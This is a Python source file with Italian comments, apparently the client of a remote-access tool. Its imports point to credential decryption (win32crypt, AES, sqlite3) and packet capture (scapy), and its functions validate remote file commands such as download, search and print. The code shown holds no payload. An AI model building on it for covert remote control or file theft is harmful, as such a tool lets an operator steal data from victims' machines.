from clientSSLconnection import *
from clientSSLFunRC import *
from clientSSL2 import *
from clientSSLRemoteCommands import *

import time
import subprocess
import os
import sys
from colorama import Fore
import zipfile
import traceback
from docx import Document
from pathlib import Path
from PyPDF2 import PdfFileReader
from cryptography.fernet import Fernet
from scapy.all import *
import ipinfo
import json
import base64
import shutil
from datetime import datetime, timedelta
from Crypto.Cipher import AES # pip install pycryptodome
import sqlite3
import win32crypt
from os import system


# OK funzione di pulizia schermo per unix e windows
def clearScreen():
    import platform
    if platform.system() == "Windows":
        system("cls")
    else:
        system("clear")


# OK gestisce il ctrl-C per l'uscita
def signalHandler(signum, frame):
    msg = "Uscita effettuata con successo"
    print(":", msg, end="", flush=True)
    exit(1)


def regexcheck_download(comando):

    windows_regex_tip1 = r'^download "[\s\S]+\.[a-z]{1,4}" (\.(\\[^\/]+)+|\.{1,2}|(\\[^\/]+)+)'
    unix_regex_tip1 = '^download \"[\s\S]+\.[a-z]{1,4}\" (\.(\/[^\/]+)+|\.{1,2}|(\/[^\/]+)+)'
    windows_regex_tip2 = r'^download "[\s\S]+\.[a-z]{1,4}" nel percorso: C:(\\[^\/]+)+'
    unix_regex_tip2 = '^download \"[\s\S]+\.[a-z]{1,4}\" nel percorso: (\/[^\/]+)+'
    result1 = 'null'
    result2 = 'null'
    import platform
    systemName = platform.system()

    if systemName == 'Windows':
        if re.match(windows_regex_tip1,comando):
            return "windowstip1"
        elif re.match(windows_regex_tip2,comando):
            return "windowstip2"
        else:
            return "not matched"
    else:
        if re.match(unix_regex_tip1,comando):
            return "unixtip1"
        elif re.match(unix_regex_tip2,comando):
            return "unixtip2"
        else:
            return "not matched"


def regexcheck_wsearch(comando):

    windows_regex_tip1 = r'^wsearch "([a-zA-Z0-9, ,\-,\_]+)" (\.(\\[^\/]+)+|\.{1,2}|(\\[^\/]+)+)'
    unix_regex_tip1 = '^wsearch \"[\s\S]+\.[a-z]{1,4}\" (\.(\/[^\/]+)+|\.{1,2}|(\/[^\/]+)+)'

    import platform
    systemName = platform.system()

    if systemName == 'Windows':
        if re.match(windows_regex_tip1,comando):
            return "windowstip1"
        else:
            return "not matched"
    else:
        if re.match(unix_regex_tip1,comando):
            return "unixtip1"
        else:
            return "not matched"


def regexcheck_openZip(comando):
    windows_regex_tip1 = r'^open "[\s\S]+\.[a-z]{1,4}" (\.(\\[^\/]+)+|\.{1,2}|(\\[^\/]+)+)'
    unix_regex_tip1 = '^open \"[\s\S]+\.[a-z]{1,4}\" (\.(\/[^\/]+)+|\.{1,2}|(\/[^\/]+)+)'

    import platform
    systemName = platform.system()
    if systemName == 'Windows':
        if re.match(windows_regex_tip1,comando):
            return "windowstip1"
        else:
            return "not matched"
    else:
        if re.match(unix_regex_tip1,comando):
            return "unixtip1"
        else:
            return "not matched"


# OK regExpr find
def regexcheck_find(comando):
    windows_regex=r'^find \.[a-z]{1,4} (\.(\\[a-zA-Z0-9, ,\_,\-]+)+|\.{1,2}|(\\[a-zA-Z0-9, ,\_,\-]+)+)'
    unix_regex='^find \.[a-z]{1,4} (\.(\/[a-zA-Z0-9, ,\_,\-]+)+|\.{1,2}|(\/[a-zA-Z0-9, ,\_,\-]+)+)'
    result = 'null'

    import platform

    if platform.system()=='Windows':
        result = re.match(windows_regex,comando)
    else:
        result = re.match(unix_regex,comando)

    if result:
        return True
    else:
        return False


# OK regExpr find
def regexcheck_print(comando):
    windows_regex_tip1 = r'^printFile "[\s\S]+\.[a-z]{1,4}" (\.(\\[^\/]+)+|\.{1,2}|(\\[^\/]+)+)'
    unix_regex_tip1 = '^printFile \"[\s\S]+\.[a-z]{1,4}\" (\.(\/[^\/]+)+|\.{1,2}|(\/[^\/]+)+)'

    import platform
    systemName = platform.system()

    if systemName == 'Windows':
        if re.match(windows_regex_tip1, comando):
            return "windowstip1"
        else:
            return "not matched"
    else:
        if re.match(unix_regex_tip1, comando):
            return "unixtip1"
        else:
            return "not matched"


# OK regExpr cd
def regexcheck_cd(comando):
    windows_regex =r'^cd ([a-zA-Z0-9, ,\-,\_]+)|^cd (\\[a-zA-Z0-9, ,\-,\_]+)+|^cd (\.(\\[a-zA-Z0-9, ,\-,\_]+)+)|^cd \.\.'
    unix_regex = '^cd ([a-zA-Z0-9, ,\-,\_]+)|^cd (\/[a-zA-Z0-9, ,\-,\_]+)+|^cd (\.(\/[a-zA-Z0-9, ,\-,\_]+)+)|^cd \.\.'

    if re.match(unix_regex, comando) or re.match(windows_regex, comando):
        return True
    else:
        return False

# OK regExpr ls
def regexcheck_ls(comando):
    windows_regex = r'^ls ([a-zA-Z0-9, ,\-,\_]+)|^ls (\\[a-zA-Z0-9, ,\-,\_]+)+|^ls (\.(\\[a-zA-Z0-9, ,\-,\_]+)+)|^ls \.\.|^ls \.|^ls'
    unix_regex = '^ls ([a-zA-Z0-9, ,\-,\_]+)|^ls (\/[a-zA-Z0-9, ,\-,\_]+)+|^ls (\.(\/[a-zA-Z0-9, ,\-,\_]+)+)|^ls \.\.|^ls \.|^ls'

    if re.match(unix_regex, comando) or re.match(windows_regex, comando):
        return True
    else:
        return False




